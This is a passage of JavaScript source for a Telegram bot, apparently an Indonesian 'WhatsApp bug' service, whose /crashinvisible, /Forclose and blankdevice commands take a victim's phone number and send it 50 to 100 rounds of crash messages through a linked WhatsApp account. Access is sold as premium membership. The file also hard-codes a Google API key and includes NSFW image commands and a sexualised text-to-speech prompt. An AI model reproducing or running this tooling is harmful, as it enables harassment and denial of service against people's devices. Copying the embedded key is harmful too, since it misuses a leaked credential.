  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : blankdevice
𖥂 Status : Process
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : blankdevice
𖥂 Status : Process
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 50; i++) {
      await BlankUiNew(sock, target);
      await new Promise((resolve) => setTimeout(resolve, 100));
      await PaketExecute(sock, target);
      await new Promise((resolve) => setTimeout(resolve, 100));
      await BlankNoClick(sock, target);
      await new Promise((resolve) => setTimeout(resolve, 100));
      await Blank(target);
      await new Promise((resolve) => setTimeout(resolve, 100));
      
    }

    console.log(chalk.red(`𖣂 Evo Engine Attack Target 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : blankdevice
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/crashinvisible (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  // --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendPhoto(chatId, getRandomImage(), {
    caption: `
<blockquote>｢ Ϟ ｣ Evo Enggine</blockquote>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/Bawzhhh" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : crashinvisible
𖥂 Status : Process
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : crashinvisible
𖥂 Status : Process
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await await CrashHorseXUiForce(jid);
      await new Promise((resolve) => setTimeout(resolve, 100));
      await await callCrash(sock, jid, isVideo = false);
      await new Promise((resolve) => setTimeout(resolve, 100));
      await await crashinvis(sock, jid, mention = true);
      await new Promise((resolve) => setTimeout(resolve, 100));
    }

    console.log(chalk.red(`𖣂 Neovelus Indictus Attack Target 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : crashinvisible
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/Forclose (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  // --- add maintenance check ---
if (isMaintenance() && !isOwner(userId) && !adminUsers.includes(userId)) {
  return bot.sendPhoto(chatId, getRandomImage(), {
    caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
⚠️ Bot sedang dalam mode MAINTENANCE.
Hanya Owner/Admin yang dapat menjalankan perintah saat ini.
`,
    parse_mode: "HTML"
  });
}
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Inventor", url: "https://t.me/Bawzhhh" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>｢ Ϟ ｣ Neovelus Indictus</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Forclose
𖥂 Status : Process
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Forclose
𖥂 Status : Process
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await CloverInvisibleV1(jid, payment = true);
      await new Promise((resolve) => setTimeout(resolve, 100));
      await callCrash(sock, jid, isVideo = false);
      await new Promise((resolve) => setTimeout(resolve, 100));
      await occolotopysV2(sock, jid);
      await new Promise((resolve) => setTimeout(resolve, 100));
      await crashinvis(sock, jid, mention = true);
      await new Promise((resolve) => setTimeout(resolve, 100));
      await CrashHorseXUiForce(jid);
      await new Promise((resolve) => setTimeout(resolve, 100));
    }

    console.log(chalk.red(`𖣂 Neovelus Indictus Attack Target 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ Neovelus Indictus System</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Forclose
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© Neovelus Indictus  𖣂
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});
/// --------- ( Plungi ) --------- \\\

/// --- ( case add bot ) --- \\\
bot.onText(/^\/addbot\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botNumber = match[1].replace(/[^0-9]/g, ""); 

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Hanya *Owner/Admin* yang dapat menjalankan perintah ini.
`, { parse_mode: "Markdown" });
  }

  if (!botNumber || botNumber.length < 8) {
    return bot.sendMessage(chatId, `
⚠️ Nomor tidak valid.
Gunakan format: \`/addbot 628xxxxxx\`
`, { parse_mode: "Markdown" });
  }

  try {
    await bot.sendMessage(chatId, `
🔄 Sedang menghubungkan *${botNumber}@s.whatsapp.net* ke sistem...
Mohon tunggu sebentar.
`, { parse_mode: "Markdown" });

    await connectToWhatsApp(botNumber, chatId);

    await bot.sendMessage(chatId, `
✅ *Berhasil terhubung!*
Bot WhatsApp aktif dengan nomor: *${botNumber}*
`, { parse_mode: "Markdown" });

  } catch (error) {
    console.error("❌ Error in /addbot:", error);
    bot.sendMessage(chatId, `
❌ Gagal menghubungkan ke WhatsApp.
> ${error.message || "Silakan coba lagi nanti."}
`, { parse_mode: "Markdown" });
  }
});
           
/// --- ( case group only ) --- \\\     
bot.onText(/^\/gruponly\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const mode = match[1].toLowerCase();
  const status = mode === "on";

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Perintah ini hanya bisa digunakan oleh *Owner/Admin*.`, { parse_mode: "Markdown" });
  }

  try {
    const data = { groupOnly: status };
    fs.writeFileSync(ONLY_FILE, JSON.stringify(data, null, 2));

    bot.sendMessage(chatId, `
⚙️ *Mode Group Only* berhasil diperbarui!
Status: *${status ? "AKTIF ✅" : "NONAKTIF ❌"}*
`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("Gagal menyimpan status Group Only:", err);
    bot.sendMessage(chatId, `
❌ Terjadi kesalahan saat menyimpan konfigurasi.
${err.message}
`, { parse_mode: "Markdown" });
  }
});

/// --- ( case add acces premium ) --- \\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
( ⚠️ ) *Akses Ditolak!*
Anda tidak memiliki izin untuk menjalankan perintah ini.`, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format berikut:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1].toLowerCase();

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
( ❌ ) *ID Tidak Valid!*
Gunakan hanya angka ID Telegram.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(chatId, `
( ❌ ) *Durasi Tidak Valid!*
Gunakan format seperti: 30d, 12h, atau 15m.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
  }

  const timeValue = parseInt(duration);
  const timeUnit = duration.endsWith("d") ? "days" :
                   duration.endsWith("h") ? "hours" : "minutes";
  const expirationDate = moment().add(timeValue, timeUnit);

  const existingUser = premiumUsers.find(u => u.id === userId);
  if (existingUser) {
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *User sudah premium!*
Waktu diperpanjang sampai:
🕓 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  } else {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *Berhasil menambahkan user premium!*
👤 ID: ${userId}
⏰ Berlaku hingga: ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  }

  console.log(`[PREMIUM] ${senderId} menambahkan ${userId} sampai ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
});

/// --- ( case list acces premium ) --- \\\
bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// --- ( case add admin ) ---
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 58273654 30d
`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 58273654 30d
`);
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menambahkan admin!
Kini user ${userId} memiliki akses admin.
`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} sudah menjadi admin.`);
  }
});


// --- ( case delete acces premium ) ---
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.`);
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delprem 584726249`);
  }

  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Invalid input. User ID harus berupa angka.");
  }

  const index = premiumUsers.findIndex(user => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di list premium.`);
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium.`);
});


// --- ( case delete acces admin ) ---
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 5843967527`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 5843967527`);
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} belum memiliki akses admin.`);
  }
});


// --- ( Case Tools Menu ) --- \\
const mp = require("fluent-ffmpeg");
const { writeFile, unlink, mkdir } = require("fs").promises;
const { existsSync } = require("fs");

bot.onText(/^\/hdvid$/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  let inputPath, outputPath;

  try {
    // Validasi reply video
    if (!reply || !reply.video) {
      return bot.sendMessage(
        chatId,
        "❌ *Reply ke video* (mp4 / mov / avi / mkv)",
        { parse_mode: "Markdown" }
      );
    }

    const mime = reply.video.mime_type || "";
    if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
      return bot.sendMessage(
        chatId,
        "❌ Format tidak didukung!\nHanya mp4 / mov / avi / mkv",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      "⏳ *Sedang memproses video HD*\nMohon tunggu ±2–4 menit...",
      { parse_mode: "Markdown" }
    );

    // Download video dari Telegram
    const fileLink = await bot.getFileLink(reply.video.file_id);
    const res = await axios.get(fileLink, { responseType: "arraybuffer" });
    const videoBuffer = Buffer.from(res.data);

    if (!videoBuffer.length) {
      return bot.sendMessage(chatId, "❌ Gagal mengunduh video!");
    }

    // Temp folder
    const tempDir = path.join(__dirname, "tmp");
    if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });

    inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
    outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);

    await writeFile(inputPath, videoBuffer);

    // Proses FFmpeg
    await new Promise((resolve, reject) => {
      mp(inputPath)
        .outputOptions([
          "-vf",
          "scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8",
          "-r", "60",
          "-preset", "faster",
          "-crf", "25",
          "-c:v", "libx264",
          "-pix_fmt", "yuv420p",
          "-c:a", "aac",
          "-b:a", "128k"
        ])
        .on("end", resolve)
        .on("error", reject)
        .save(outputPath);
    });

    // Kirim hasil
    await bot.sendVideo(
      chatId,
      outputPath,
      { caption: "✅ Video berhasil ditingkatkan kualitasnya!" }
    );

  } catch (e) {
    console.error("[HDVID ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Gagal meningkatkan kualitas video."
    );
  } finally {
    // Cleanup
    setTimeout(async () => {
      try { if (inputPath) await unlink(inputPath); } catch {}
      try { if (outputPath) await unlink(outputPath); } catch {}
    }, 5000);
  }
});

bot.onText(/^\/snackvideos(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1]?.trim();

  try {
    if (!username) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/snackvideos <username>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      "⏳ *Searching SnackVideo profile...*",
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.deline.web.id/search/snackvideo?username=${encodeURIComponent(username)}`
    );

    if (!data?.status) {
      return bot.sendMessage(
        chatId,
        "❌ *User not found.*",
        { parse_mode: "Markdown" }
      );
    }

    const profile = data.result.profile;
    const videos = data.result.videos || [];

    let message =
`🎬 *SnackVideo Profile*
👤 *${profile.nama}* (@${profile.id})
📦 Total Videos: *${profile.total_video}*
❤️ Likes: *${profile.total_like}*
👥 Followers: *${profile.followers}*

🖼 Profile Picture:
${profile.foto_profil}

📁 *Video List*

`;

    videos.forEach((v, i) => {
      message +=
`*${i + 1}. ${v.judul_video}*
📝 ${v.deskripsi || "No description"}
📅 Upload: \`${v.tanggal_upload}\`
👁 Views: *${v.views}* | ❤️ Likes: *${v.likes}* | 🔁 Shares: *${v.shares}*

🔗 Page: ${v.url_halaman}
🎥 Video: ${v.url_file_video}

`;
    });

    // Pecah pesan panjang (limit Telegram ±4096)
    const chunkSize = 3500;
    for (let i = 0; i < message.length; i += chunkSize) {
      await bot.sendMessage(
        chatId,
        message.substring(i, i + chunkSize),
        {
          parse_mode: "Markdown",
          disable_web_page_preview: true
        }
      );
    }

  } catch (e) {
    console.error("[SNACKVIDEOS ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *SNACKVIDEO SEARCH ERROR*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/happymodsearch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();

  try {
    if (!query) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/happymodsearch <app name>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      `⏳ *Searching HappyMod Apps...*\n🔍 *Keyword:* ${query}\nPlease wait...`,
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.deline.web.id/search/happymod?q=${encodeURIComponent(query)}`
    );

    if (!data?.status || !Array.isArray(data.result) || data.result.length === 0) {
      return bot.sendMessage(
        chatId,
        `❌ *No results found for:* ${query}`,
        { parse_mode: "Markdown" }
      );
    }

    let message =
`🔍 *HappyMod Search Result*

*Keyword:* ${query}
*Total Found:* ${data.result.length}

`;

    data.result.forEach((v, i) => {
      message +=
`*${i + 1}. ${v.title}*
📦 Package: \`${v.package}\`
📁 Size: ${v.size}
🧬 Version: ${v.version}
🔧 Mod: ${v.modInfo || "-"}
🔗 Download: ${v.page_dl}

`;
    });

    await bot.sendMessage(chatId, message, {
      parse_mode: "Markdown",
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error("[HAPPYMODSEARCH ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *HAPPYMOD SEARCH ERROR*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/gay$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(
      chatId,
      "⏳ Sedang mengambil gambar *Gay*...",
      { parse_mode: "Markdown" }
    );

    const res = await axios.get(
      "https://api.nekolabs.web.id/random/nsfwhub/gay",
      { responseType: "arraybuffer" }
    );

    const imgBuffer = Buffer.from(res.data);

    await bot.sendPhoto(
      chatId,
      imgBuffer,
      { caption: "🎴 Random Gay" }
    );

  } catch (e) {
    console.error("[GAY ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Gagal mengambil gambar Gay!"
    );
  }
});

bot.onText(/^\/hentai$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(
      chatId,
      "⏳ Sedang mengambil gambar *Hentai*...",
      { parse_mode: "Markdown" }
    );

    const res = await axios.get(
      "https://api.nekolabs.web.id/random/nsfwhub/hentai",
      { responseType: "arraybuffer" }
    );

    const imgBuffer = Buffer.from(res.data);

    await bot.sendPhoto(
      chatId,
      imgBuffer,
      { caption: "🎴 Random Hentai" }
    );

  } catch (e) {
    console.error("[HENTAI ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Gagal mengambil gambar Hentai!"
    );
  }
});

bot.onText(/^\/girl-japan$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(
      chatId,
      "⏳ Sedang mengambil gambar *Japanese Girl*...",
      { parse_mode: "Markdown" }
    );

    const response = await axios.get(
      "https://api.nekolabs.web.id/random/girl/japan",
      { responseType: "arraybuffer" }
    );

    const imageBuffer = Buffer.from(response.data);

    await bot.sendPhoto(
      chatId,
      imageBuffer,
      { caption: "🇯🇵 Japanese Girl" }
    );

  } catch (e) {
    console.error("[GIRL-JAPAN ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat mengambil gambar Japanese Girl!"
    );
  }
});

bot.onText(/^\/girl-indonesia$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(
      chatId,
      "⏳ Sedang mengambil gambar *Indonesian Girl*...",
      { parse_mode: "Markdown" }
    );

    const response = await axios.get(
      "https://api.nekolabs.web.id/random/girl/indonesia",
      { responseType: "arraybuffer" }
    );

    const imageBuffer = Buffer.from(response.data);

    await bot.sendPhoto(
      chatId,
      imageBuffer,
      { caption: "🇮🇩 Indonesian Girl" }
    );

  } catch (e) {
    console.error("[GIRL-INDONESIA ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat mengambil gambar Indonesian Girl!"
    );
  }
});

bot.onText(/^\/girl-china$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(
      chatId,
      "⏳ Sedang mengambil gambar *Chinese Girl*...",
      { parse_mode: "Markdown" }
    );

    const response = await axios.get(
      "https://api.nekolabs.web.id/random/girl/china",
      { responseType: "arraybuffer" }
    );

    const imageBuffer = Buffer.from(response.data);

    await bot.sendPhoto(
      chatId,
      imageBuffer,
      { caption: "🇨🇳 Chinese Girl" }
    );

  } catch (e) {
    console.error("[GIRL-CHINA ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat mengambil gambar Chinese Girl!"
    );
  }
});

const { PassThrough } = require("stream");

const API_URL = "https://firebasevertexai.googleapis.com/v1beta";
const MODEL_URL = "projects/gemmy-ai-bdc03/locations/us-central1/publishers/google/models";
const API_KEY = "AIzaSyD6QwvrvnjU7j-R6fkOghfIVKwtvc7SmLk";

const buildTTSBody = (text, model = "gemini-2.5-flash-preview-tts") => ({
  contents: [
    {
      role: "model",
      parts: [
        {
          text:
            "[selalu gunakan bahasa indonesia, selalu gunakan gaya bicara yang imut dan gemesin, selalu gunakan nada lemas, lelah, seperti setelah melakukan hubungan seksual.]"
        }
      ]
    },
    {
      role: "user",
      parts: [{ text }]
    }
  ],
  generationConfig: {
    responseModalities: ["audio"],
    temperature: 1,
    speech_config: {
      voice_config: {
        prebuilt_voice_config: { voice_name: "Leda" }
      }
    }
  }
});

// ================================
// GENERATE TTS
// ================================
async function generateTTS(
  text,
  { model = "gemini-2.5-flash-preview-tts", delay = 1000 } = {}
) {
  while (true) {
    try {
      const body = buildTTSBody(text, model);

      const response = await axios.post(
        `${API_URL}/${MODEL_URL}/${model}:generateContent`,
        body,
        {
          headers: {
            "content-type": "application/json",
            "x-goog-api-client": "gl-kotlin/2.1.0-ai fire/16.5.0",
            "x-goog-api-key": API_KEY
          }
        }
      );

      const parts = response.data?.candidates?.[0]?.content?.parts || [];
      const audioParts = parts.filter(p => p.inlineData);

      if (!audioParts.length) throw new Error("No audio returned");

      const combinedBase64 = audioParts
        .map(p => p.inlineData.data)
        .join("");

      return await convertPCMtoOGG(combinedBase64);

    } catch (err) {
      await new Promise(r => setTimeout(r, delay));
      delay = Math.min(delay * 1.2, 60000);
    }
  }
}

// ================================
// PCM → OGG
// ================================
function convertPCMtoOGG(b64) {
  return new Promise((resolve, reject) => {
    const pcm = Buffer.from(b64, "base64");
    const inputStream = new PassThrough();
    const outputStream = new PassThrough();
    const chunks = [];

    inputStream.end(pcm);

    outputStream.on("data", c => chunks.push(c));
    outputStream.on("end", () => resolve(Buffer.concat(chunks)));
    outputStream.on("error", reject);

    mp(inputStream)
      .inputOptions(["-f", "s16le", "-ar", "24000", "-ac", "1"])
      .toFormat("ogg")
      .audioCodec("libopus")
      .audioBitrate(64)
      .audioFrequency(24000)
      .audioChannels(1)
      .outputOptions(["-compression_level", "10"])
      .on("error", reject)
      .pipe(outputStream);
  });
}

// ================================
// COMMAND /tta
// ================================
bot.onText(/^\/tta(?:\s+(.+))?$/, async (msg, match) => {
